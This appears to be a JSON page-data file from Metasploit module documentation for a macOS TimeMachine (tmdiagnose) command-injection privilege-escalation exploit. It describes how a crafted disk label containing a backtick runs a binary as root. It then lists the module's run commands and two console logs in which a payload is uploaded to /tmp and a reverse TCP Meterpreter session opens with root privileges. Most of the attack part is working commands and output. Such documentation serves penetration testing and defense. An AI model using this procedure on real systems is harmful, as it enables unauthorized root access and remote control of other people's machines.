{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/osx/local/timemachine_cmd_injection","result":{"data":{"moduleMetadataJson":{"id":"f42e8f09-c4ba-53de-bb72-e5aa45d59dc5","name":"Mac OS X TimeMachine (tmdiagnose) Command Injection Privilege Escalation","fullname":"exploit/osx/local/timemachine_cmd_injection","description":"This module exploits a command injection in TimeMachine on macOS <= 10.14.3 in\n        order to run a payload as root. The tmdiagnose binary on OSX <= 10.14.3 suffers\n        from a command injection vulnerability that can be exploited by creating a\n        specially crafted disk label.\n\n          The tmdiagnose binary uses awk to list every mounted volume, and composes\n        shell commands based on the volume labels. By creating a volume label with the\n        backtick character, we can have our own binary executed with root priviledges.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/osx/local/timemachine_cmd_injection","documentationSlug":"/modules/documentation/exploit/osx/local/timemachine_cmd_injection","referencesSlug":"/modules/references/exploit/osx/local/timemachine_cmd_injection"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a command injection in TimeMachine on macOS &#x3C;= 10.14.3 in order to run a payload as root. The tmdiagnose binary on OSX &#x3C;= 10.14.3 suffers from a command injection vulnerability that can be exploited by creating a specially crafted disk label.</p>\n<p>The tmdiagnose binary uses awk to list every mounted volume, and composes shell commands based on the volume labels. By creating a volume label with the backtick character, we can have our own binary executed with root priviledges.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Get a session on a vulnerable system</li>\n<li><code class=\"language-text\">use exploit/osx/local/timemachine_cmd_injection</code></li>\n<li><code class=\"language-text\">set lhost &lt;IP&gt;</code></li>\n<li><code class=\"language-text\">set lport &lt;PORT&gt;</code></li>\n<li><code class=\"language-text\">set session &lt;session_id&gt;</code></li>\n<li><code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"mac-osx-10143-mojave\" style=\"position:relative;\"><a href=\"#mac-osx-10143-mojave\" aria-label=\"mac osx 10143 mojave permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mac OSX 10.14.3 (Mojave)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/handler) &gt; use exploit/osx/local/timemachine_cmd_injection\nmsf5 exploit(osx/local/timemachine_cmd_injection) &gt; exploit\n\n[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 192.168.0.2:5555\n[*] Uploading file: &#39;/tmp/qhjlknnmf&#39;\n[*] Executing exploit &#39;/tmp/qhjlknnmf&#39;\n[*] Exploit result:\n2019-04-18 16:18:29.190 qhjlknnmf[51122:107119] creating dmg image\n2019-04-18 16:18:33.300 qhjlknnmf[51122:107119] mounting malformed disk\n2019-04-18 16:18:33.564 qhjlknnmf[51122:107119] sending XPC msg\n2019-04-18 16:18:33.564 qhjlknnmf[51122:107119] now wait a few minutes for the root command to run\n[*] Transmitting first stager...(210 bytes)\n[*] Transmitting second stager...(8192 bytes)\n[*] Sending stage (808504 bytes) to 192.168.0.2\n[*] Meterpreter session 2 opened (192.168.0.2:5555 -&gt; 192.168.0.2:34270) at 2019-04-18 16:20:02 +0800\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"macos-10133-high-sierra\" style=\"position:relative;\"><a href=\"#macos-10133-high-sierra\" aria-label=\"macos 10133 high sierra permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MacOS 10.13.3 (High Sierra)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[!] SESSION may not be compatible with this module.\n[*] Started reverse TCP handler on 192.168.86.1.31:4444\n[*] Uploading file: &#39;/tmp/.xbdtqiynvb&#39;\n[*] Executing exploit &#39;/tmp/.xbdtqiynvb&#39;\n[*] Exploit result:\n2019-06-29 12:26:29.052 .xbdtqiynvb[553:3447] creating dmg image\n2019-06-29 12:26:33.193 .xbdtqiynvb[553:3447] mounting malformed disk\n2019-06-29 12:26:33.533 .xbdtqiynvb[553:3447] sending XPC msg\n2019-06-29 12:26:33.534 .xbdtqiynvb[553:3447] now wait a few minutes for the root command to run\n[*] Transmitting first stager...(210 bytes)\n[*] Transmitting second stager...(8192 bytes)\n[*] Sending stage (813560 bytes) to 192.168.86.1.32\n[*] Meterpreter session 3 opened (192.168.86.1.31:4444 -&gt; 192.168.86.1.32:55888) at 2019-06-29 05:27:24 -0500\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=0, euid=0, egid=0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f42e8f09-c4ba-53de-bb72-e5aa45d59dc5"}}}